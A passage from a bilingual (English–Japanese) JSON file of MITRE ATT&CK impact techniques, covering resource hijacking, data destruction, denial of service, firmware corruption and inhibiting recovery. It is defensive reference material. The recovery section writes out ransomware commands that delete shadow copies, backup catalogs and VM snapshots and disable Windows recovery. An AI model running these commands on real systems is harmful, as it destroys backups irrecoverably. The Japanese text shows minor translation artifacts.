                "description_eng": "Adversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. \n\nResource hijacking may take a number of different forms. For example, adversaries may:\n\n* Leverage compute resources in order to mine cryptocurrency\n* Sell network bandwidth to proxy networks\n* Generate SMS traffic for profit\n* Abuse cloud-based messaging services to send large quantities of spam messages\n\nIn some cases, adversaries may leverage multiple types of Resource Hijacking at once.(Citation: Sysdig Cryptojacking Proxyjacking 2023)",
                "description_jp": "敵対者は、リソース集約的なタスクを完了するために、共同利用されたシステムのリソースを活用する可能性があり、システムおよび/またはホストされたサービスの可用性に影響を与える可能性がある。\n\nリソースのハイジャックは、様々な形で行われます。例えば、敵対者は次のようなことが考えられます：\n\n* 暗号通貨を採掘するために計算資源を利用する。\n* プロキシ・ネットワークにネットワーク帯域幅を販売する。\n* 利益のためにSMSトラフィックを生成する\n* クラウドベースのメッセージングサービスを悪用して大量のスパムメッセージを送信する。\n\n場合によっては、敵対者は複数のタイプのリソース・ハイジャックを同時に活用することもある(引用：Sysdig Cryptojacking Proxyjacking 2023)",
                "subtechniques": [
                    {
                        "id": "T1496.001",
                        "name_eng": "Compute Hijacking",
                        "name_jp": "コンピュート・ハイジャック",
                        "description_eng": "Adversaries may leverage the compute resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. \n\nOne common purpose for [Compute Hijacking](https://attack.mitre.org/techniques/T1496/001) is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for [Compute Hijacking](https://attack.mitre.org/techniques/T1496/001) and cryptocurrency mining.(Citation: CloudSploit - Unused AWS Regions) Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.(Citation: Unit 42 Hildegard Malware)(Citation: Trend Micro Exposed Docker APIs)\n\nAdditionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it’s not competing for resources.(Citation: Trend Micro War of Crypto Miners)",
                        "description_jp": "敵対者は、リソースを大量に消費するタスクを完了するために、共同利用されたシステムの計算リソースを活用する可能性があり、システムおよび/またはホストされたサービスの可用性に影響を与える可能性があります。\n\nコンピュート・ハイジャック](https://attack.mitre.org/techniques/T1496/001)の一般的な目的の1つは、暗号通貨ネットワークのトランザクションを検証し、仮想通貨を獲得することです。攻撃者は、影響を受けたマシンに悪影響を与えたり、応答しなくなったりするのに十分なシステムリソースを消費する可能性があります。(引用: Kaspersky Lazarus Under The Hood Blog 2017) サーバーやクラウドベースのシステムは、利用可能なリソースの可能性が高いため、一般的なターゲットですが、ユーザーのエンドポイントシステムも侵害され、[Compute Hijacking](https://attack.mitre.org/techniques/T1496/001)や暗号通貨のマイニングに使用される可能性があります(引用: CloudSploit - Unused AWS Regions) また、公開されたAPIを介したデプロイの容易さや、環境やクラスタ内で複数のコンテナをデプロイまたは侵害することでマイニング活動を拡大できる可能性から、コンテナ環境も標的となる可能性があります(引用: Unit 42 Hildegard Malware)(引用: Trend Micro Exposed Docker API)\n\nさらに、暗号通貨マイニングマルウェアの中には、リソースを奪い合わないようにするために、競合するマルウェアのプロセスを停止させるものもあります。 (引用: Trend Micro War of Crypto Miners)"
                    },
                    {
                        "id": "T1496.002",
                        "name_eng": "Bandwidth Hijacking",
                        "name_jp": "帯域幅ハイジャック",
                        "description_eng": "Adversaries may leverage the network bandwidth resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. \n\nAdversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate [Network Denial of Service](https://attack.mitre.org/techniques/T1498) campaigns and/or to seed malicious torrents.(Citation: GoBotKR) Alternatively, they may engage in proxyjacking by selling use of the victims' network bandwidth and IP address to proxyware services.(Citation: Sysdig Proxyjacking) Finally, they may engage in internet-wide scanning in order to identify additional targets for compromise.(Citation: Unit 42 Leaked Environment Variables 2024)\n\nIn addition to incurring potential financial costs or availability disruptions, this technique may cause reputational damage if a victim’s bandwidth is used for illegal activities.(Citation: Sysdig Proxyjacking)",
                        "description_jp": "敵対者は、共 同システムのネットワーク帯域幅リソースを活用して、リソースを大量に消費するタスクを実行す る可能性があり、システムおよび/またはホストサービスの可用性に影響を与える可能性がある。\n\nまた、ボットネットの一部としてシステムのネットワーク帯域幅を利用するマルウェアを使用して、[Network Denial of Service](https://attack.mitre.org/techniques/T1498)キャンペーンを促進したり、悪意のあるトレントをシードしたりすることもあります。(引用：GoBotKR) また、被害者のネットワーク帯域幅と IP アドレスの使用をプロキシウェアサービスに販売することで、プロキシ ジャッキングを行う場合もあります(引用：Sysdig Proxyjacking)。最後に、侵害のさらなる標的を特定するために、インターネット全体のスキャンを行う場合もあります(引用：Unit 42 Leaked Environment Variables 2024)。\n\nこの手法では、金銭的なコストや可用性の中断が発生する可能性があるだけでなく、被害者の帯域幅が違法行為に使用されると、風評被害が発生する可能性もあります(引用：Sysdig Proxyjacking)。"
                    },
                    {
                        "id": "T1496.004",
                        "name_eng": "Cloud Service Hijacking",
                        "name_jp": "クラウド・サービスのハイジャック",
                        "description_eng": "Adversaries may leverage compromised software-as-a-service (SaaS) applications to complete resource-intensive tasks, which may impact hosted service availability. \n\nFor example, adversaries may leverage email and messaging services, such as AWS Simple Email Service (SES), AWS Simple Notification Service (SNS), SendGrid, and Twilio, in order to send large quantities of spam / [Phishing](https://attack.mitre.org/techniques/T1566) emails and SMS messages.(Citation: Invictus IR DangerDev 2024)(Citation: Permiso SES Abuse 2023)(Citation: SentinelLabs SNS Sender 2024) Alternatively, they may engage in LLMJacking by leveraging reverse proxies to hijack the power of cloud-hosted AI models.(Citation: Sysdig LLMJacking 2024)(Citation: Lacework LLMJacking 2024)\n\nIn some cases, adversaries may leverage services that the victim is already using. In others, particularly when the service is part of a larger cloud platform, they may first enable the service.(Citation: Sysdig LLMJacking 2024) Leveraging SaaS applications may cause the victim to incur significant financial costs, use up service quotas, and otherwise impact availability.",
                        "description_jp": "攻撃者は、侵害されたSaaS（Software-as-a-Service）アプリケーションを活用して、リソースを大量に消費するタスクを実行する可能性があり、ホスト型サービスの可用性に影響を与える可能性があります。\n\n例えば、敵対者は、AWS Simple Email Service (SES)、AWS Simple Notification Service (SNS)、SendGrid、Twilioなどの電子メールやメッセージングサービスを活用して、大量のスパム/[フィッシング](https://attack.mitre.org/techniques/T1566)電子メールやSMSメッセージを送信する可能性があります。(引用：Invictus IR DangerDev 2024)(引用：Permiso SES Abuse 2023)(引用：SentinelLabs SNS Sender 2024) あるいは、クラウドでホストされたAIモデルのパワーを乗っ取るためにリバースプロキシを使ってLLMJackingを行うこともある(引用：Sysdig LLMJacking 2024)(引用：Lacework LLMJacking 2024)\n\n敵対者は、被害者がすでに利用しているサービスを活用する場合もある。また、特にそのサービスがより大規模なクラウドプラットフォームの一部である場合、まずそのサービスを有効化することもある(引用：Sysdig LLMJacking 2024) SaaSアプリケーションを活用することで、被害者は多額の金銭的コストを負担したり、サービスクォータを使い切ったり、可用性に影響を与えたりする可能性がある。"
                    },
                    {
                        "id": "T1496.003",
                        "name_eng": "SMS Pumping",
                        "name_jp": "SMSポンピング",
                        "description_eng": "Adversaries may leverage messaging services for SMS pumping, which may impact system and/or hosted service availability.(Citation: Twilio SMS Pumping) SMS pumping is a type of telecommunications fraud whereby a threat actor first obtains a set of phone numbers from a telecommunications provider, then leverages a victim’s messaging infrastructure to send large amounts of SMS messages to numbers in that set. By generating SMS traffic to their phone number set, a threat actor may earn payments from the telecommunications provider.(Citation: Twilio SMS Pumping Fraud)\n\nThreat actors often use publicly available web forms, such as one-time password (OTP) or account verification fields, in order to generate SMS traffic. These fields may leverage services such as Twilio, AWS SNS, and Amazon Cognito in the background.(Citation: Twilio SMS Pumping)(Citation: AWS RE:Inforce Threat Detection 2024) In response to the large quantity of requests, SMS costs may increase and communication channels may become overwhelmed.(Citation: Twilio SMS Pumping)",
                        "description_jp": "攻撃者はメッセージングサービスを活用してSMSポンピングを行う可能性があり、システムおよび/またはホストされたサービスの可用性に影響を与える可能性があります。 引用：Twilio SMSポンピング）SMSポンピングは電気通信詐欺の一種で、脅威行為者はまず電気通信プロバイダから電話番号セットを入手し、次に被害者のメッセージングインフラストラクチャを活用して、そのセットの番号に大量のSMSメッセージを送信します。電話番号セットへのSMSトラフィックを生成することで、脅威行為者は通信プロバイダから支払いを得ることができる。 引用：Twilio SMSポンピング詐欺\n\n脅威行為者は、SMSトラフィックを生成するために、ワンタイムパスワード（OTP）フィールドやアカウント確認フィールドなど、一般に公開されているウェブフォームを使用することがよくあります。これらのフィールドは、Twilio、AWS SNS、Amazon Cognitoなどのサービスをバックグラウンドで活用する可能性があります(引用：Twilio SMS Pumping)(Citation: AWS RE:Inforce Threat Detection 2024) 大量のリクエストに応じて、SMSのコストが増加し、通信チャネルが圧迫される可能性があります(引用：Twilio SMS Pumping)"
                    }
                ]
            },
            {
                "id": "T1485",
                "name_eng": "Data Destruction",
                "name_jp": "データ破棄",
                "description_eng": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018).\n\nIn cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers.(Citation: Data Destruction - Threat Post)(Citation: DOJ  - Cisco Insider) Similarly, they may delete virtual machines from on-prem virtualized environments.",
                "description_jp": "攻撃者は、システム、サービス、ネットワーク・リソースへの可用性を妨害するために、特定のシステム上やネットワーク上の大量のデータやファイルを破壊する可能性がある。データ破壊は、ローカルドライブやリモートドライブ上のファイルやデータを上書きすることで、フォレンジック技術によって保存データを復元不可能にする可能性が高い。(引用: Symantec Shamoon 2012)(引用: FireEye Shamoon Nov 2016)(引用: Palo Alto Shamoon Nov 2016)(引用: Kaspersky StoneDrill 2017)(引用: Unit 42 Shamoon3 2018)(引用: Talos Olympic Destroyer 2018) <code>del</code> や <code>rm</code> などの一般的なオペレーティング システムのファイル削除コマンドは、多くの場合、ファイルの内容そのものを消去することなくファイルへのポインタを削除するだけであるため、適切なフォレンジック手法によってファイルを復元可能な状態にします。この動作は、[ディスクコンテンツワイプ](https://attack.mitre.org/techniques/T1561/001) や [ディスク構造ワイプ](https://attack.mitre.org/techniques/T1561/002) とは異なり、ストレージディスクのセクションやディスクの論理構造ではなく、個々のファイルが破壊されるためです。\n\n攻撃者は、ファイルやディレクトリをランダムに生成されたデータで上書きし、復元不可能な状態にしようとすることがある(引用: Kaspersky StoneDrill 2017)(引用: Unit 42 Shamoon3 2018) 政治的な意図で作成されたイメージファイルがデータの上書きに使用されたケースもある(引用: FireEye Shamoon 2016年11月号)(引用: Palo Alto Shamoon 2016年11月号)(引用: Kaspersky StoneDrill 2017)\n\nネットワーク全体の可用性の中断が目標とされる運用において、標的組織への影響を最大化するために、データの破壊を目的として設計されたマルウェアは、[Valid Accounts](https://attack.mitre.org/techniques/T1078)、[OS Credential Dumping](https://attack.mitre.org/techniques/T1003)、[SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002)(引用: Symantec Shamoon 2012)(引用: FireEye Shamoon Nov 2016)(引用: Palo Alto Shamoon Nov 2016)(引用: Kaspersky StoneDrill 2017)(引用: Talos Olympic Destroyer 2018)。\n\nクラウド環境では、敵対者はクラウドストレージオブジェクト、マシンイメージ、データベースインスタンス、および組織やその顧客に損害を与えるための運用に不可欠なその他のインフラストラクチャを削除するためにアクセスを活用する可能性があります（引用：Data Destruction - Threat Post）（引用：DOJ - Cisco Insider）同様に、敵対者はオンプレミスの仮想化環境から仮想マシンを削除する可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1485.001",
                        "name_eng": "Lifecycle-Triggered Deletion",
                        "name_jp": "ライフサイクルトリガーによる削除",
                        "description_eng": "Adversaries may modify the lifecycle policies of a cloud storage bucket to destroy all objects stored within.  \n\nCloud storage buckets often allow users to set lifecycle policies to automate the migration, archival, or deletion of objects after a set period of time.(Citation: AWS Storage Lifecycles)(Citation: GCP Storage Lifecycles)(Citation: Azure Storage Lifecycles) If a threat actor has sufficient permissions to modify these policies, they may be able to delete all objects at once. \n\nFor example, in AWS environments, an adversary with the `PutLifecycleConfiguration` permission may use the `PutBucketLifecycle` API call to apply a lifecycle policy to an S3 bucket that deletes all objects in the bucket after one day.(Citation: Palo Alto Cloud Ransomware)(Citation: Halcyon AWS Ransomware 2025) In addition to destroying data for purposes of extortion and [Financial Theft](https://attack.mitre.org/techniques/T1657), adversaries may also perform this action on buckets storing cloud logs for [Indicator Removal](https://attack.mitre.org/techniques/T1070).(Citation: Datadog S3 Lifecycle CloudTrail Logs)",
                        "description_jp": "攻撃者は、クラウドストレージのバケットのライフサイクルポリシーを変更し、その中に保存されているオブジェクトをすべて破壊する可能性がある。  \n\nクラウドストレージバケットでは多くの場合、ユーザーがライフサイクルポリシーを設定し、一定期間後のオブジェクトの移行、アーカイブ、削除を自動化できるようになっている（引用：AWS Storage Lifecycles）（引用：GCP Storage Lifecycles）（引用：Azure Storage Lifecycles）脅威行為者がこれらのポリシーを変更する十分な権限を持っている場合、すべてのオブジェクトを一度に削除できる可能性がある。\n\n例えば、AWS環境では、`PutLifecycleConfiguration`権限を持つ敵対者は、`PutBucketLifecycle`APIコールを使用して、1日後にバケット内のすべてのオブジェクトを削除するライフサイクルポリシーをS3バケットに適用することができる。(引用: Palo Alto Cloud Ransomware)(引用: Halcyon AWS Ransomware 2025) 恐喝や[Financial Theft](https://attack.mitre.org/techniques/T1657)の目的でデータを破壊するだけでなく、敵対者は[Indicator Removal](https://attack.mitre.org/techniques/T1070)のためにクラウドログを保存しているバケットに対してもこのアクションを実行する可能性がある。(引用: Datadog S3 Lifecycle CloudTrail Logs)"
                    }
                ]
            },
            {
                "id": "T1498",
                "name_eng": "Network Denial of Service",
                "name_jp": "ネットワークサービス拒否",
                "description_eng": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                "description_jp": "攻撃者は、ネットワークサービス拒否（DoS）攻撃を実行し、ユーザーに対する標的リソースの可用性を低下させたり、ブロックしたりすることがある。ネットワークDoSは、サービスが依存しているネットワーク帯域幅を使い果たすことによって実行されます。リソースの例としては、特定のウェブサイト、電子メールサービス、DNS、ウェブベースのアプリケーションなどがあります。攻撃者は、政治的な目的（引用：FireEye OpPoisonedHandover 2016年2月）や、気晴らし（引用：FSISAC FraudNetDoS 2012年9月）、ハクティビズム、恐喝を含む他の悪意のある活動を支援するために、ネットワークDoS攻撃を行うことが観察されている（引用：Symantec DDoS 2014年10月）。\n\nネットワークDoSは、リソースまたはリソースが依存するネットワーク接続とネットワークデバイスに向けられた悪意のあるトラフィックの量によって、システムへのネットワーク接続の帯域幅容量が枯渇したときに発生します。たとえば、インターネットへの接続が1Gbpsのネットワークでホストされているサーバーに、敵が10Gbpsのトラフィックを送信することがあります。このトラフィックは、単一のシステムによって生成されることもあれば、インターネット上に分散した複数のシステムによって生成されることもあり、一般に分散型DoS（DDoS）と呼ばれています。\n\nネットワークDoS攻撃を行うには、IPアドレスのなりすましやボットネットなど、複数の手法が適用される側面があります。\n\n攻撃者は、攻撃システムの元のIPアドレスを使用したり、攻撃トラフィックを攻撃システムまで追跡することを困難にしたり、リフレクションを可能にするためにソースIPアドレスを詐称したりします。これにより、ネットワーク防御デバイスの送信元アドレスによるフィルタリングの有効性が低下または排除されるため、防御側の攻撃防御の難易度が高まる可能性があります。\n\nホスティングシステムを直接標的とする DoS 攻撃については、[Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499) を参照のこと。",
                "subtechniques": [
                    {
                        "id": "T1498.002",
                        "name_eng": "Reflection Amplification",
                        "name_jp": "反射増幅",
                        "description_eng": "Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target.(Citation: Cloudflare ReflectionDoS May 2017) This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.\n\nReflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS(Citation: Cloudflare DNSamplficationDoS) and NTP(Citation: Cloudflare NTPamplifciationDoS), though the use of several others in the wild have been documented.(Citation: Arbor AnnualDoSreport Jan 2018)  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.(Citation: Cloudflare Memcrashed Feb 2018)",
                        "description_jp": "攻撃者は、大量のネットワーク・トラフィックをターゲットに反映させることで、サービス拒否（DoS）を引き起こそうとすることがある。この種のネットワークDoSは、指定されたなりすましソースIPアドレスをホストし、それに応答するサードパーティサーバの仲介を利用します。このサードパーティサーバは、一般にリフレクタと呼ばれます。敵対者は、被害者のなりすましアドレスを持つリフレクタにパケットを送信することで、リフレクション攻撃を達成する。Direct Network Floodsと同様に、攻撃を実行するために複数のシステムが使用される場合や、ボットネットが使用される場合があります。同様に、ターゲットにトラフィックを集中させるために、1つまたは複数のリフレクタが使用されることもあります（引用：Cloudflare ReflectionDoS 2017年5月）。このネットワークDoS攻撃は、ターゲットとなるシステムやネットワークの可用性や機能を低下させることもあります。\n\nReflection攻撃は、一般にReflection Amplification攻撃として知られているように、トラフィックを増幅するために、リクエストよりもレスポンスが大きいプロトコルを利用することがよくあります。攻撃者は、増幅器に送信されるリクエストよりも数桁大きい攻撃トラフィック量の増加を発生させることができるかもしれない。この増加の程度は、問題のプロトコル、使用される技法、攻撃量の増幅を実際に生成する増幅サーバーなど、多くの変数に依存する。Reflection Amplification Floodsを可能にした2つの著名なプロトコルは、DNS(引用: Cloudflare DNSamplficationDoS)とNTP(引用: Cloudflare NTPamplifciationDoS)ですが、その他にもいくつかのプロトコルの使用が記録されています(引用: Arbor AnnualDoSreport Jan 2018) 特に、memcacheプロトコルは、増幅サイズがリクエストパケットの最大51,200倍という強力なプロトコルであることを示しました(引用: Cloudflare Memcrashed Feb 2018)"
                    },
                    {
                        "id": "T1498.001",
                        "name_eng": "Direct Network Flood",
                        "name_jp": "ダイレクト・ネットワーク・フラッド",
                        "description_eng": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                        "description_jp": "攻撃者は、大量のネットワークトラフィックをターゲットに直接送信することで、サービス拒否（DoS）を引き起こそうとする可能性があります。このDoS攻撃は、標的となるシステムやネットワークの可用性や機能を低下させることもある。[ダイレクト・ネットワーク・フラッド](https://attack.mitre.org/techniques/T1498/001)は、1つまたは複数のシステムを使用して、標的となるサービスのネットワークに向けて大量のネットワーク・パケットを送信するものです。フラッドには、ほとんどすべてのネットワークプロトコルが使用できる。UDPやICMPのようなステートレスプロトコルが一般的に使用されるが、TCPのようなステートフルプロトコルも使用できる。\n\nボットネットは、ネットワークやサービスに対してネットワークフラッディング攻撃を行うためによく使用される。大規模なボットネットは、グローバル・インターネットに広がるシステムから大量のトラフィックを生成する可能性があります。攻撃者は、独自のボットネット・インフラを構築して制御するリソースを持っている場合もあれば、既存のボットネットの時間を借りて攻撃を行う場合もあります。分散型DoS（DDoS）の最悪のケースでは、フラッドを生成するために非常に多くのシステムが使用されるため、ターゲット・ネットワークを飽和させるのに十分なトラフィック量を生成するには、各システムが少量のトラフィックを送信するだけで済みます。このような状況では、DDoSトラフィックと正当なクライアントを区別することは非常に難しくなります。ボットネットは、米国の大手銀行を標的とした2012年の一連のインシデントなど、最も有名なDDoSフラッディング攻撃のいくつかで使用されている（引用：USNYAG IranianBotnet 2016年3月）。"
                    }
                ]
            },
            {
                "id": "T1495",
                "name_eng": "Firmware Corruption",
                "name_jp": "ファームウェアの破損",
                "description_eng": "Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system.(Citation: Symantec Chernobyl W95.CIH) Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards.\n\nIn general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. For example, corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable.(Citation: dhs_threat_to_net_devices)(Citation: cisa_malware_orgs_ukraine) Depending on the device, this attack may also result in [Data Destruction](https://attack.mitre.org/techniques/T1485).",
                "description_jp": "攻撃者は、システムに接続されたデバイスのシステムBIOSやその他のファームウェアのフラッシュメモリの内容を上書きまたは破損して、それらを操作不能または起動不能にし、デバイスおよび/またはシステムの使用を拒否する可能性があります。(引用: Symantec Chernobyl W95.CIH) ファームウェアは、デバイスの機能を初期化および管理するために、ハードウェアデバイス上の不揮発性メモリからロードおよび実行されるソフトウェアです。これらのデバイスには、マザーボード、ハードドライブ、ビデオカードなどが含まれます。\n\n一般的に、敵対者は、システムやデバイスの使用を拒否するために、ファームウェアを操作、上書 き、または破損する可能性がある。例えば、ネットワーク・デバイスのオペレーティング・システムのロードを担当するファームウェアの 破壊は、ネットワーク・デバイスを操作不能にするかもしれない。（引用：dhs_threat_to_net_devices）（引用：cisa_malware_orgs_ukraine） デバイスによっては、この攻撃はまた、[Data Destruction]（https://attack.mitre.org/techniques/T1485）をもたらすかもしれない。",
                "subtechniques": []
            },
            {
                "id": "T1490",
                "name_eng": "Inhibit System Recovery",
                "name_jp": "システム回復の阻害",
                "description_eng": "Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options.\n\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Furthermore, adversaries may disable recovery notifications, then corrupt backups.(Citation: disable_notif_synology_ransom)\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>\n* <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system\n* <code>diskshadow.exe</code> can be used to delete all volume shadow copies on a system - <code>diskshadow delete shadows all</code> (Citation: Diskshadow) (Citation: Crytox Ransomware)\n\nOn network devices, adversaries may leverage [Disk Wipe](https://attack.mitre.org/techniques/T1561) to delete backup firmware images and reformat the file system, then [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.\n\nOn ESXi servers, adversaries may delete or encrypt snapshots of virtual machines to support [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486), preventing them from being leveraged as backups (e.g., via ` vim-cmd vmsvc/snapshot.removeall`).(Citation: Cybereason)\n\nAdversaries may also delete “online” backups that are connected to their network – whether via network storage media or through folders that sync to cloud services.(Citation: ZDNet Ransomware Backups 2020) In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, database backups, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.(Citation: Dark Reading Code Spaces Cyber Attack)(Citation: Rhino Security Labs AWS S3 Ransomware)",
                "description_jp": "攻撃者は、内蔵データを削除または除去し、破損したシステムの復旧を支援するために設計されたサービスをオフにして復旧を妨げる可能性がある(引用：Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) これにより、利用可能なバックアップや復旧オプションへのアクセスが拒否される可能性がある。\n\nオペレーティングシステムには、バックアップカタログ、ボリュームシャドウコピー、自動修復機能など、破損したシステムの修復に役立つ機能が含まれている場合があります。敵対者は、[Data Destruction](https://attack.mitre.org/techniques/T1485)や[Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486)の効果を増強するために、システムのリカバリ機能を無効にしたり削除したりする可能性があります(引用: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) さらに、敵対者はリカバリ通知を無効にして、バックアップを破損させる可能性があります(引用: disable_notif_synology_ransom)\n\nシステムの回復機能を無効にしたり削除したりするために、多くのWindowsネイティブユーティリティが敵対者によって使用されてきた：\n\n<code>vssadmin.exe delete shadows /all /quiet</code> システム上のすべてのボリューム シャドウ コピーを削除するために <code>vssadmin.exe delete shadows /all /quiet</code> を使用できます。\n* Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)を使用して、ボリュームシャドウコピーを削除できます。\n* <code>wbadmin.exe</code> は Windows バックアップ カタログを削除するために使用できます - <code>wbadmin.exe delete catalog -quiet</code> 。\n* <code>bcdedit.exe</code> は、ブート構成データを変更することにより、Windows の自動回復機能を無効にするために使用できます - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code> 。\n* <code>REAgentC.exe<//code> は、感染したシステムの Windows 回復環境 (WinRE) の修復/回復オプションを無効にするために使用できます。\n* <code>diskshadow.exe</code> は、システム上のすべてのボリューム シャドウ コピーを削除するために使用できます - <code>diskshadow delete shadows all</code> (引用: Diskshadow) (引用: Crytox Ransomware)\n\nネットワーク・デバイスでは、敵対者は[Disk 